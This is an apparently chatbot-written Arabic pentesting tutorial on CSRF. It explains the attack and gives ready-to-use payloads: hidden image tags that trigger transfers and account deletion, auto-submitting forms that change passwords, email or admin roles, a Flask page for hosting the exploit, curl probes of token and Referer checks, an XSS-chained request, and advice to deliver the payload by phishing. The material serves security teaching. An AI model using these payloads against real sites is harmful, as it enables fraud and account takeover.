
### **1. مفهوم CSRF بعمق**
CSRF هو هجوم يستغل **ثقة الموقع في جلسة المستخدم المصادق عليه**. يعني إذا المستخدم مسجل دخوله (Authenticated) على موقع، المهاجم بيحاول يخليه ينفذ طلبات (مثل تغيير كلمة سر، تحويل فلوس، حذف حساب) من غير ما يعرف. الطلب بيتم باستخدام الـ **Session Cookie** اللي بيبعتها المتصفح تلقائياً مع أي طلب للموقع.

#### **لماذا CSRF خطير؟**
- الطلب بيظهر كأنه جاي من المستخدم الشرعي لأن الـ Cookie بتاع الجلسة بيترسل معاه.
- المواقع اللي مش بتستخدم حماية زي **CSRF Tokens** بتكون عرضة للهجوم ده.
- الهجوم ممكن يتنفذ بطرق بسيطة زي رابط، صورة، أو حتى كود JavaScript.

#### **الخلاصة بالعامية**:
CSRF زي ما تكون داخل بنك، وواحد غريب بيخليك توقع على ورقة تحويل فلوس من غير ما تقرأها. هو بيستغل إن البنك عارفك (جلسة تسجيل الدخول)، فيعمل التحويل من غير ما يشك.

---

### **2. الجانب الفني: كيف يتم تنفيذ هجوم CSRF؟**
لتنفيذ هجوم CSRF، لازم نفهم إزاي الموقع بيشتغل:
- الموقع بيستخدم طلبات **GET** أو **POST** لتنفيذ الإجراءات (مثل تحويل فلوس أو تغيير إعدادات).
- لو الطلب مش محمي بـ **CSRF Token**، أي طلب من المستخدم المسجل هيتنفذ.

#### **خطوات تنفيذ الهجوم عملياً**:
1. **تحليل الموقع**:
   - استخدم أداة زي **Burp Suite** لتفحص طلبات الموقع (GET/POST).
   - شوف إذا كان فيه **CSRF Token** أو أي حماية (زي رأس الـ Referer أو Origin).
   - ابحث عن وظائف حساسة (مثل تغيير كلمة السر، تحويل فلوس، إضافة أدمن).

2. **إنشاء طلب خبيث**:
   - لو الطلب **GET**، ممكن تستخدم رابط مباشر أو صورة.
   - لو الطلب **POST**، هتحتاج كود HTML/JavaScript لإرسال الطلب تلقائياً.

3. **خداع الضحية**:
   - أرسل الطلب الخبيث للضحية عبر رابط، بريد إلكتروني، أو موقع مزيف.

#### **مثال عملي 1: هجوم CSRF باستخدام طلب GET**
افترض موقع بنك بيسمح بتحويل فلوس عبر طلب GET زي ده:
```
/transfer?amount=1000&to=attacker_account
```
- لو المستخدم مسجل دخوله، مجرد فتح الرابط ده هيحول 1000 لحساب المهاجم.
- كود هجوم بسيط (صورة خبيثة):
```html
<img src="/transfer?amount=1000&to=attacker_account" width="0" height="0">
```
- لو حطيت الكود ده في موقع أو بريد إلكتروني، المستخدم هيفتح الصورة والطلب هيتنفذ من غير ما يحس.

#### **مثال عملي 2: هجوم CSRF باستخدام طلب POST**
افترض موقع بيغير كلمة السر بطلب POST زي ده:
```
POST /change-password
Content-Type: application/x-www-form-urlencoded
new_password=attacker123
```
- لو الموقع مش بيستخدم CSRF Token، ممكن تعمل نموذج HTML يبعت الطلب ده تلقائياً:
```html
<html>
  <body>
    <form action="/change-password" method="POST" id="csrf-form">
      <input type="hidden" name="new_password" value="attacker123">
    </form>
    <script>
      document.getElementById("csrf-form").submit();
    </script>
  </body>
</html>
```
- احفظ الكود ده كملف `exploit.html`، واستضفه على سيرفر أو أرسله للضحية. لما الضحية يفتح الصفحة، الطلب هيتبعت تلقائياً.

#### **استخدام أدوات**:
- **Burp Suite**:
  - افتح Burp، وقّع طلب POST أو GET من الموقع.
  - استخدم **Engagement Tools > Generate CSRF PoC** لإنشاء كود هجوم جاهز.
- **Python Flask** (لإنشاء صفحة خبيثة):
```python
from flask import Flask, render_template_string

app = Flask(__name__)

@app.route('/')
def csrf_exploit():
    return render_template_string('''
    <form action="/change-password" method="POST" id="csrf-form">
      <input type="hidden" name="new_password" value="attacker123">
    </form>
    <script>document.getElementById("csrf-form").submit();</script>
    ''')

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000)
```
- ارفع الكود ده على سيرفر، وأرسل الرابط للضحية.

#### **الخلاصة بالعامية**:
زي ما تكون بتصمم فخ للضحية. بتحط كود في صفحة أو رابط، وتخليه ينفذ حاجة في الموقع من غير ما يحس. لو الموقع طلباته GET، حط رابط أو صورة. لو POST، اعمل فورم HTML تخليها تبعت الطلب لوحدها. الأدوات زي Burp بتسهل عليك تطلع الكود جاهز.

---

### **3. تحليل استجابة الموقع وتجاوز الحمايات**
كتير من المواقع بتحط حمايات ضد CSRF، وكـ Pentester لازم تعرف إزاي تتحقق منها وتتجاوزها لو فيه ثغرة.

#### **أنواع الحمايات الشائعة**:
1. **CSRF Token**:
   - رمز عشوائي بيترسل مع كل طلب POST أو GET.
   - لازم تتأكد إذا الرمز ده فعلاً عشوائي ومرتبط بالجلسة.
   - **اختبار الثغرة**: أرسل طلب من غير الرمز أو باستخدام رمز قديم، لو اتقبل، يبقى فيه ثغرة.

2. **رأس Referer/Origin**:
   - الموقع بيتحقق إن الطلب جاي من نفس النطاق (Domain).
   - **التجاوز**: بعض المواقع بتقبل رأس Referer فارغ أو من نطاق فرعي (Subdomain).

3. **SameSite Cookies**:
   - إعداد للـ Cookies بيمنع إرسالها مع طلبات من مواقع خارجية.
   - **التجاوز**: لو الإعداد `Lax` أو مش موجود، الهجوم ممكن ينجح.

#### **اختبار عملي لتجاوز الحماية**:
- **اختبار CSRF Token**:
  - استخدم Burp Suite لتسجيل طلب POST.
  - أعد إرسال الطلب من غير الـ Token أو بـ Token مختلف:
    ```bash
    curl -X POST -d "new_password=attacker123" /change-password
    ```
  - لو الطلب اتقبل، يبقى الـ Token مش فعال.

- **اختبار Referer**:
  - أعد إرسال الطلب مع رأس Referer فارغ أو من موقع آخر:
    ```bash
    curl -X POST -H "Referer: " -d "new_password=attacker123" /change-password
    ```
  - لو نجح، يبقى فيه ثغرة.

- **اختبار SameSite Cookies**:
  - افتح الموقع في متصفح، واستخدم DevTools (F12) لفحص الـ Cookies.
  - لو الـ Cookie مش عليه `SameSite=Strict`، جرب هجوم CSRF عادي.

#### **الخلاصة بالعامية**:
الموقع لو حاطط حماية زي الـ Token أو الـ Referer، لازم تفحصها كويس. جرب تبعت طلبات من غير الـ Token أو بـ Referer فاضي. لو الموقع قبل الطلب، يبقى فيه فتحة تستغلها. الأدوات زي Curl وBurp هتخليك تختبر بسرعة.

---

### **4. سيناريوهات استغلال CSRF (للـ Pentester)**

#### **سيناريو 1: تحويل أموال في موقع بنك**
- **الوصف**: موقع بنك بيسمح بتحويل فلوس بطلب GET أو POST من غير CSRF Token.
- **الاستغلال**:
  - أنشئ رابط زي: `/transfer?amount=1000&to=attacker_account`.
  - أرسله للضحية عبر بريد إلكتروني أو حطه في صورة.
  - **مثال كود**:
    ```html
    <a href="/transfer?amount=1000&to=attacker_account">Click here for a surprise!</a>
    ```

#### **سيناريو 2: تغيير كلمة السر**
- **الوصف**: موقع بيسمح بتغيير كلمة السر بطلب POST.
- **الاستغلال**:
  - أنشئ صفحة HTML تبعت طلب POST تلقائياً (زي المثال في القسم 2).
  - استضف الصفحة على موقعك وأرسل الرابط للضحية.
  - **مثال إضافي**:
    ```html
    <iframe style="display:none" name="csrf-frame"></iframe>
    <form method="POST" action="/change-password" target="csrf-frame">
      <input type="hidden" name="new_password" value="hacked123">
      <input type="submit" value="Submit" onclick="this.parentNode.submit();">
    </form>
    ```

#### **سيناريو 3: إضافة مستخدم أدمن**
- **الوصف**: لوحة تحكم (Admin Panel) بتسمح بإضافة مستخدمين بطلب POST.
- **الاستغلال**:
  - استهدف أدمن مسجل دخوله.
  - أنشئ طلب POST يضيف مستخدم بصلاحيات أدمن:
    ```html
    <form action="/admin/add-user" method="POST" id="csrf-form">
      <input type="hidden" name="username" value="attacker">
      <input type="hidden" name="role" value="admin">
    </form>
    <script>document.getElementById("csrf-form").submit();</script>
    ```

#### **سيناريو 4: حذف حساب المستخدم**
- **الوصف**: موقع بيسمح بحذف الحساب بطلب GET.
- **الاستغلال**:
  - استخدم رابط زي: `/delete-account?user_id=123`.
  - ضعه في صورة أو رابط خبيث:
    ```html
    <img src="/delete-account?user_id=123" style="display:none">
    ```

#### **سيناريو 5: تعديل إعدادات الموقع**
- **الوصف**: موقع بيسمح بتغيير إعدادات (مثل البريد الإلكتروني أو إعدادات الأمان).
- **الاستغلال**:
  - أنشئ طلب POST يغير البريد الإلكتروني للمهاجم:
    ```html
    <form action="/update-email" method="POST" id="csrf-form">
      <input type="hidden" name="email" value="attacker@example.com">
    </form>
    <script>document.getElementById("csrf-form").submit();</script>
    ```

#### **سيناريو 6: استغلال ثغرة في API**
- **الوصف**: بعض المواقع بتستخدم API لتنفيذ الإجراءات، وممكن يكون الـ API مش محمي.
- **الاستغلال**:
  - استخدم طلب POST للـ API مباشرة:
    ```html
    <form action="/api/v1/transfer" method="POST" id="csrf-form">
      <input type="hidden" name="amount" value="5000">
      <input type="hidden" name="to" value="attacker_account">
    </form>
    <script>document.getElementById("csrf-form").submit();</script>
    ```

#### **سيناريو 7: استغلال مع Social Engineering**
- **الوصف**: إقناع الضحية بفتح رابط خبيث عبر هجوم تصيد (Phishing).
- **الاستغلال**:
  - أنشئ صفحة مزيفة تبدو زي الموقع الرسمي، وحط فيها كود CSRF.
  - أرسل بريد إلكتروني يقول: "اضغط هنا لتحديث حسابك".
  - الكود هينفذ الطلب الخبيث لما الضحية يضغط.

#### **سيناريو 8: استغلال مع XSS**
- **الوصف**: لو فيه ثغرة XSS في نفس الموقع، ممكن تستخدمها لتنفيذ CSRF.
- **الاستغلال**:
  - أدخل كود JavaScript عبر ثغرة XSS ينفذ طلب CSRF:
    ```javascript
    var xhr = new XMLHttpRequest();
    xhr.open("POST", "/change-password", true);
    xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
    xhr.send("new_password=attacker123");
    ```

#### **الخلاصة بالعامية**:
فيه كذا طريقة تستغل بيها CSRF: زي إنك تحط رابط يحول فلوس، أو صفحة تغير كلمة السر، أو حتى تهكر لوحة أدمن. لو لقيت ثغرة XSS، ممكن تخليها أقوى. المهم تختبر كل حاجة حساسة في الموقع وتشوف إزاي تقدر توصل الضحية للرابط الخبيث.

---

### **5. نصائح للـ Pentester**
1. **اختبر كل الطلبات الحساسة**:
   - ركز على طلبات POST وGET اللي بتغير بيانات (مثل تحديث الملف الشخصي، إرسال فلوس).
2. **استخدم أدوات تلقائية**:
   - أدوات زي **OWASP ZAP** أو **Burp Suite** بتساعدك تلاقي ثغرات CSRF بسرعة.
3. **دمج مع هجمات أخرى**:
   - CSRF مع XSS أو Phishing بيخلّي الهجوم أخطر.
4. **وثّق الثغرة**:
   - لما تلاقي ثغرة، اعمل PoC (Proof of Concept) واضح، وشرح تأثيرها (مثل تحويل فلوس أو تغيير بيانات).
5. **اختبر الحمايات**:
   - جرب تبعت طلبات بدون CSRF Token، أو بـ Referer فاضي، أو من نطاق تاني.

---

### **الخلاصة النهائية بالعامية**:
CSRF هو فخ بيستغل إن الموقع بيثق فيك لما تكون logged in. كـ Pentester، دورك تلاقي الطلبات الحساسة (زي تحويل فلوس أو تغيير إعدادات) وتشوف لو الموقع مش محمي كويس. اعمل كود خبيث (رابط، صورة، صفحة HTML) وجرب تبعته لنفسك كـ PoC. لو لقيت حماية زي Token، فحصها كويس، يمكن تكون ضعيفة. ولو لقيت XSS، خلّيها سلاحك السري. جرب كل السيناريوهات (تحويل فلوس، تغيير باسوورد، حذف حساب) وخلّي تقريرك جامد!

لو عايز تفاصيل أكتر عن أي سيناريو أو أداة، قولي!